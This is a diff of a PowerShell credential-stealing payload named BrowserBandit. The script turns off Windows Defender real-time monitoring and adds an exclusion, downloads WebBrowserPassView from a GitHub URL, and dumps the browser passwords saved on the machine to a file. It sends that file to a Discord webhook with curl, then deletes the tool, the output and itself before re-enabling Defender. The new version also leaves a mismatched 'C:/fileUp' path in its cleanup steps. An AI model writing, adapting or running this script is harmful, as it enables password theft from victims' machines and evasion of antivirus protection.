@@ -1,24 +1,31 @@
-$random = -join ((48..57) | Get-Random -Count 3 | ForEach-Object {[char]$_})
+# Define variables
+$dir = "C:/BrowserBandit"
+$exePath = "$dir/WebBrowserPassView.exe"
+$outputFile = "$env:UserName-passwords.txt"
+$discordWebhook = "<DISCORDWEBHOOK HERE>"
+$srcUrl = "https://raw.githubusercontent.com/Code-382/Payload-Depot/main/SignalStrike/Browser%20Bandit/WebBrowserPassView.exe?token=GHSAT0AAAAAACXIFIYHTBAFBUCCSI52SSN6ZXBQYFA"
 
-mkdir C:/fileUp
+# Create directory and disable real-time monitoring
+mkdir $dir
 Set-MpPreference -DisableRealtimeMonitoring 1
-Set-MpPreference -ExclusionPath "C:/fileUp"
-Invoke-WebRequest URI -OutFile "C:/fileUp/WebBrowserPassView.exe"
+Set-MpPreference -ExclusionPath $dir
 
-Set-Location C:\fileUp
-.\WebBrowserPassView.exe /stext passwords-$env:UserName$random.txt
+# Download the WebBrowserPassView executable
+Invoke-WebRequest $srcUrl -OutFile $exePath
 
-Start-Sleep -seconds 15
+# Run the executable and save the output to a text file
+Set-Location "C:/fileUp"
+& $exePath /stext $outputFile
 
-curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@passwords-$env:UserName$random.txt" webhook
+# Upload the file to Discord
+curl.exe -F "payload_json={\`"content\`": \`"\`"}" -F "file=@$outputFile" $discordWebhook
 
-Start-Sleep -seconds 1
+# Clean up
+Remove-Item $exePath, $outputFile
+cd ..
+Remove-Item "C:/fileUp"
+Remove-Item "$env:temp\BrowserBandit.ps1"
 
-Remove-Item WebBrowserPassView.exe
-Remove-Item passwords-$env:UserName$random.txt
-cd..
-Remove-Item fileUp
-Remove-Item $env:temp\passview.ps1
-
+# Re-enable real-time monitoring and exit
 Set-MpPreference -DisableRealtimeMonitoring 0
 exit
